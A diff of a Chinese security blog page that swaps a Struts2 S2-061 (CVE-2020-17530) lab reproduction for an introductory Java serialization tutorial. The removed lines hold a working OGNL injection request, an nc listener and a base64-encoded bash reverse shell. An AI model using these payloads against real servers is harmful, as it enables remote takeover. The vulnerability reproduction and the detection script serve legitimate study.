@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2023/03/29/struts2-s2-061-远程命令执行漏洞（cve-2020-17530）复现/"/>
+  <link rel="canonical" href="http://example.com/2023/04/05/java安全-反序列化-一/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,21 +31,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现 - GhostToKnow</title>
-  <meta name="keywords" content="Struts2,null">
+  <title>java安全 反序列化(一) - GhostToKnow</title>
+  <meta name="keywords" content="反序列化,null">
   <meta desc name="description" content="GhostToKnow - GhostToKnow - GhostToKnow">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现">
-<meta property="og:url" content="http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="java安全 反序列化(一)">
+<meta property="og:url" content="http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/index.html">
 <meta property="og:site_name" content="GhostToKnow">
-<meta property="og:description" content="前言Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。 影响版本： Apache Struts">
+<meta property="og:description" content="前言序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。序列化是一种对象持久化的手段，可以将对象的状态转换为字节数组，来便于存储或者传输的机制;可以有效地实现多平台之间的通信、对象持久化存储。 Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectlnputStream类的readObject">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-03-29T13:21:36.000Z">
-<meta property="article:modified_time" content="2023-03-29T13:32:08.442Z">
+<meta property="article:published_time" content="2023-04-05T05:39:07.000Z">
+<meta property="article:modified_time" content="2023-04-05T05:56:01.293Z">
 <meta property="article:author" content="GhostToKnow">
-<meta property="article:tag" content="Struts2">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2342,7 +2342,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/29/Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/05/java安全-反序列化-一/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="GhostToKnow">
   </span>
@@ -2356,7 +2356,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class='headimg-div'>
       <a class='headimg-a'>
-        <img itemprop="image" class='headimg' src='https://s3.bmp.ovh/imgs/2023/03/29/43e8bf8d987eb0f2.png'/>
+        <img itemprop="image" class='headimg' src='https://s2.loli.net/2023/04/05/mZ9arBIUxnD2wCX.jpg'/>
       </a>
     </div>
   
@@ -2365,7 +2365,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现
+        java安全 反序列化(一)
       </h1>
       <div class='new-meta-box'>
         
@@ -2384,10 +2384,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    <a class="category-link" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url"><span itemprop="name">漏洞复现</span></a>
+        <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">java安全</span></a>
       </span>
     
   </div>
@@ -2396,10 +2396,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-03-29T14:21:36+01:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-04-05T06:39:07+01:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Mar 29, 2023</p>
+    <p>发布于：Apr 5, 2023</p>
   </a>
 </div>
 
@@ -2410,13 +2410,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>738 words</p>
+      <p>2.2k words</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>3 min</p>
+      <p>9 min</p>
     </a>
   </div>
 
@@ -2452,41 +2452,74 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。</p>
-<p>影响版本：</p>
-<p>Apache Struts 2.0.0 - 2.5.25</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用vulhub漏洞环境搭建</p>
-<p>使用git克隆到本地</p>
-<p><code>git clone https://github.com/vulhub/vulhub.git</code></p>
-<p><img src="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152107512"></p>
-<p>进入对应环境</p>
-<p><code>cd vulhub/struts2/s2-061</code></p>
-<p><img src="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152142885"></p>
-<p>启动docker漏洞环境</p>
-<p><code>sudo docker-compose up -d</code></p>
-<p><img src="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152205091"></p>
-<p>访问对应地址，出现如下页面，环境搭建成功</p>
-<p><img src="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210153856655"></p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>实现判断下是否存在漏洞，使用?id&#x3D;%25{7*7}查看返回id的值是7*7还是49，如果是47那么就说明进行了二次表达式解析，存在改漏洞</p>
-<p><img src="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210160031545"></p>
-<p>这里id为49说明存在该漏洞。抓包修改为以下，这里的<code>#arglist.add(&quot;xx&quot;)</code>函数这里包含的值是你要执行的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /.action HTTP/1.1</span><br><span class="line">Host: 192.168.52.128:8080</span><br><span class="line">User-Agent: xxx</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=node0i3sptalo62q6kw46qu49oxwn1.node0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 833</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。序列化是一种对象持久化的手段，可以将对象的状态转换为字节数组，来便于存储或者传输的机制;可以有效地实现多平台之间的通信、对象持久化存储。</p>
+<p>Java中的<code>ObjectOutputStream</code>类的<code>writeObject()</code>方法可以实现序列化，类<code>ObjectlnputStream</code>类的<code>readObject()</code>方法用于反序列化。</p>
+<p>就像游戏的存档，中途退出后存档，再次游玩时读取存档恢复上次游戏离开时的状态</p>
+<h2 id="序列化基础知识："><a href="#序列化基础知识：" class="headerlink" title="序列化基础知识："></a>序列化基础知识：</h2><p>一个类对象要想实现序列化，必须满足两个条件：</p>
+<p>​	该类的所有属性必须是可序列化的。</p>
+<p>​	需要实现Serializable或Externalizable接口</p>
+<p>实现其中一个接口就可以了</p>
+<p>java.io.Serializable</p>
+<p>java.io.Externalizable</p>
+<h3 id="java-io-Serializable"><a href="#java-io-Serializable" class="headerlink" title="java.io.Serializable"></a>java.io.Serializable</h3><p>public interface Serializable {}</p>
+<p>这个是标记接口里面什么内容都没有，本身是没有意思的。编译器知道这个标记有什么含义，对实现了这个接口的类会进行特殊处理。</p>
+<p>实现了这个接口的类，编译器就知道这个对象是可以用来序列化</p>
+<h3 id="java-io-Externalizable"><a href="#java-io-Externalizable" class="headerlink" title="java.io.Externalizable"></a>java.io.Externalizable</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">java</span>.io.Serializable&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210161714309"></p>
-<p>已经可以执行我们的命令了，接下来反弹shell</p>
-<p>在vps上监听3333端口：<code>nc -lvnp 3333</code></p>
-<p>编写反弹shell代码</p>
-<p><code>bash -i &gt;&amp; /dev/tcp/192.168.52.130/3333 0&gt;&amp;1</code></p>
-<p>反弹shell涉及到管道符问题要将命令进行base64编码</p>
-<p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-<p><img src="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210163917170"></p>
-<p><img src="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210164523698"></p>
-<p>成功反弹出shell</p>
-<p>检查POC</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url</span>():</span><br><span class="line">		parser = argparse.ArgumentParser(description=<span class="string">&#x27;S2-061  CVE-2020-17530&#x27;</span>)</span><br><span class="line">		parser.add_argument(<span class="string">&#x27;target_url&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;The target address,example: http://192.168.52.128:8080&#x27;</span>)</span><br><span class="line">		args = parser.parse_args()</span><br><span class="line">		<span class="keyword">global</span> url</span><br><span class="line">		url = args.target_url</span><br><span class="line">		<span class="keyword">if</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">or</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;请使用http://或者https://&#x27;</span>)</span><br><span class="line">			os._exit(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">if</span> url.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">			url = url[:-<span class="number">1</span>]</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;开始测试&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> url</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">	headers=&#123;</span><br><span class="line">		<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100102 Firefox/107.0&#x27;</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	vul_url = url + <span class="string">&#x27;/?id=%25&#123;7*7&#125;&#x27;</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		text = requests.get(vul_url,headers=headers,timeout=<span class="number">10</span>).text</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;49&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[漏洞存在]&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[漏洞不存在]&#x27;</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;[发生错误]&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	url()</span><br><span class="line">	poc()</span><br></pre></td></tr></table></figure>
+<p>Externalizable接口也是实现了Serializable接口，并且有2个方法，要继承这个接口必须要实现接口定义的方法。</p>
+<h2 id="尝试序列化和反序列化"><a href="#尝试序列化和反序列化" class="headerlink" title="尝试序列化和反序列化"></a>尝试序列化和反序列化</h2><p>对一个类进行序列化需要执行ObjectOutputStream.writeObject方法写入对象。</p>
+<p>对一个类进行反序列化需要ObjectIputStream.readObject从输入流中读取字节然后转换成对象。</p>
+<p>在反序列化的过程中，是直接拿到对象而不是new一个所以被反序列化操作的类不会执行构造方法</p>
+<p>注意看注解</p>
+<p>TestSerialize</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSerialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="comment">//被transient关键字修饰的成员属性变量不被序列化</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">private</span> String password;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestSerialize</span><span class="params">(String name, String pass)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = name;</span><br><span class="line">        <span class="built_in">this</span>.password = pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUse</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;uasrname: &quot;</span>+username);</span><br><span class="line">        System.out.println(<span class="string">&quot;password: &quot;</span>+password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TestSerialize&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210170934924"></p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 Struts 2.5.26 版本或更高版本</p>
+<p>main</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestSerialize</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestSerialize</span>(<span class="string">&quot;GhostToKnow&quot;</span>,<span class="string">&quot;123123&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个FIleOutputStream类</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./Test.ser&quot;</span>);</span><br><span class="line">            <span class="comment">// FileOutputStream类,字节输出流，用于处理原始二进制数据。将数据写到文件,需要将数据转换成字节并将其保存到文件。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将这个FIleOutputStream类封装到ObjectOutputStream中</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            <span class="comment">// ObjectOutputStream，对象的输出流，将指定的对象写入到文件完成对象的序列化过程</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用writeObject方法，序列化对象到文件Test.ser中</span></span><br><span class="line">            oos.writeObject(ser);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个FIleInutputStream类</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./Test.ser&quot;</span>);</span><br><span class="line">            <span class="comment">// FileInputStream文件输入流，是将文本文件中的数据输入到内存中。他是一个字节输入流，是InputStream抽象类的一个子类</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将FileInputStream类封装到ObjectInputStream中</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="comment">// ObjectInputStream,反序列化流，将使用ObjectOutputStream序列化的原始数据恢复为对象，以流的方式读取对象</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用readObject从user.ser中反序列化出对象，默认是Object类型,需要进行类型转换，</span></span><br><span class="line">            <span class="type">TestSerialize</span> <span class="variable">test</span> <span class="operator">=</span> (TestSerialize)ois.readObject();</span><br><span class="line"></span><br><span class="line">            test.testUse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/05/nysFWU8Y2caw6R5.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/05/nysFWU8Y2caw6R5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126145422550"></p>
+<p><img src="https://s2.loli.net/2023/04/05/s5rnAoqjcJFxDfp.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/05/s5rnAoqjcJFxDfp.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221127125955115"></p>
+<p>0xACED：STREAM_MAGIC，声明使用了序列化协议，<strong>从这里可以判断保存的内容是否为序列化数据。</strong> （这是在黑盒挖掘反序列化漏洞很重要的一个点）</p>
+<p>0x0005：STREAM_VERSION，序列化协议版本。</p>
+<p>0x73:	TC_OBJECT</p>
+<p>0x72:	TC_CLASSDESC</p>
+<p>0x00…01：serialVersionUID</p>
+<h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p><code>private static final long serialVersionUID = 1;</code></p>
+<p>作用：在反序列化的时候保证与本地类的版本相同</p>
+<p>不自定义会自动生成UID</p>
+<p>如果两个不同内容的类，在包名类名都一样时，是不能进行相互反序列化的，但如果定义的UID一样，那么生成的序列化文件就可以进行反序列化操作。</p>
+<h2 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h2><p>在序列化一个类的时候并不想写入多余的数据，需要自定义读取和写入 readObject	write Object</p>
+<p>java是支持自定义readObject与writeObject方法的,只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    oos.writeUTF(username);</span><br><span class="line">    oos.writeUTF(password);</span><br><span class="line">    System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
